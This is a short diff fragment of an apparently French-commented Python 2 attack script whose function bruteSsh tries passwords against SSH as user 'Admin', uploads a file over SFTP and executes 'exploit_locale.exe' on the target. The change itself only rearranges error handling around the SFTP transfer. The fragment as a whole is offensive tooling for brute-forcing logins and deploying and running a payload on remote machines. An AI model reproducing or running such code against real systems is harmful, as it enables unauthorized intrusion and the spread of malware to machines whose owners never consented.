@@ -218,15 +218,15 @@ def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupérati
 			transport = paramiko.Transport((ip, 22))
 			print password
 			transport.connect(username = 'Admin', password = password)
-		except:
-			print "[*] erreur lors de l'ouverture di tunnel SFTP"
-		try:
 			sftp = paramiko.SFTPClient.from_transport(transport)
-			sftp.put(source,destination)
-			sftp.close
 		except:
-			print "[*] erreur lors du transfert sftp"
-			break
+			print "[*] erreur lors de l'ouverture du tunnel SFTP"
+		#try:
+		sftp.put(source,destination)
+		sftp.close
+		#except:
+		#	print "[*] erreur lors du transfert sftp"
+		#	break
 		try:
 			stdin, stdout, stderr = ssh.exec_command('start exploit_locale.exe')
 			time.sleep(5)
